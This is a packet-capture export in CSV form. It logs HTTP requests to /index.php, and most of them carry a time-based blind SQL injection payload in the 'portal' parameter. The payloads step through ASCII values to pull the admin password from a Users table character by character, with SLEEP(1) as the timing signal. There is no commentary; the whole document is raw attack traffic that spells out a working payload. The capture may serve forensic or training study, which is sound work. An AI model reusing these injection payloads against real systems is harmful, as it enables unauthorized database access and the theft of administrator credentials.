"No.","Time","Source","Destination","Protocol","Length","Info"
"12197","133.892836999","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D109%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12199","133.895619488","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12207","133.909122514","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D110%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12209","133.911859838","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12217","133.924344431","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D111%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12219","133.927132598","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12227","133.938476625","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D112%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12229","133.941299042","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12237","133.957026233","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D113%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12239","133.959795266","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12247","133.971012368","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D114%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12249","133.973733181","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12257","133.983829479","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D115%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12259","133.986635297","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12267","133.997145359","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D116%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12269","133.999943336","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12277","134.011649609","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D117%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12279","134.014433685","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12287","134.025651450","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D118%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12289","134.028474256","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12297","134.039479411","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D119%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12299","134.042283630","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12307","134.057954184","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D120%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12309","134.060795874","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12317","134.071956127","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D121%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12319","134.074747468","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12327","134.086470167","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D122%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12329","134.089270623","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12337","134.100303064","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D65%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12339","134.103089337","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12347","134.113664890","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D66%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12349","134.116493475","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12357","134.127309754","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D67%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12359","134.130097687","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12367","134.140615081","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D68%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12369","134.143388219","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12377","134.158559508","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D69%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12379","134.161351659","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12387","134.172753042","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D70%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12389","134.175510224","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12397","134.186465006","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D71%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12399","134.189261568","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12407","134.199677901","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D72%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12409","134.202413724","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12417","134.213361760","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D73%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12419","134.216150895","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12426","134.239596502","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D74%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12428","134.242404309","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12436","134.261240285","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D75%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12438","134.263938773","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12444","134.283953013","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D76%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12447","134.286529446","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12455","134.298412561","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D77%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12457","134.301182639","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12465","134.319731771","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D78%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12467","134.322589260","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12475","134.333052830","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D79%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12477","134.335832401","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12485","134.346552028","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D80%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12487","134.349345340","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12495","134.363303018","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D81%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12497","134.365906275","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12505","134.377250343","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D82%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12507","134.379694286","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12515","134.393033962","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D83%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12517","134.394774584","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12525","134.405403854","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D84%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12527","134.407046722","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12533","134.428777067","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D85%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12536","134.431085594","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12546","134.441545610","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D86%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12548","134.444284022","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12556","134.459142851","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D87%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12558","134.461800051","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12566","134.472390301","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D88%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12568","134.475115642","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12576","134.485916250","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D89%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12578","134.488699825","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12585","134.500083609","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D90%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12588","134.502883625","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12596","134.517470366","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D33%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12598","134.520255713","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12606","134.534765325","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D34%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12608","134.537551331","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12616","134.548533097","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D35%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12618","134.551272116","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12625","134.562704882","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D36%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12628","134.565448599","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12636","134.577433206","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D37%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12638","134.580162319","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12646","134.591104352","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D38%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12648","134.593808209","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12656","134.604512794","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D39%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12658","134.607265006","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12666","134.619367603","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D40%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12668","134.622134101","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12676","134.632937764","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D41%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12678","134.635693911","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12686","134.647542110","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D42%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12688","134.650343225","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12695","134.664010341","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D43%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12698","134.666799865","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12706","134.681419252","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D44%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12708","134.684207829","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12716","134.696633755","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D45%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12718","134.699400069","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12726","134.711053745","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D46%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12728","134.713660477","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12736","134.724702264","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D47%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12738","134.727465445","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12746","134.739546403","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D58%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12748","134.742339521","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12756","134.753073127","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D59%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12758","134.755824500","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12766","134.770741136","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D60%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12768","134.773515825","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12776","134.784339628","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D61%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12778","134.785582870","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12786","134.797315388","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D62%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12788","134.798463012","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12796","134.810388949","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D63%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"12798","134.811531405","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"12806","134.824236444","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C37%2C1%29%29%3D64%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
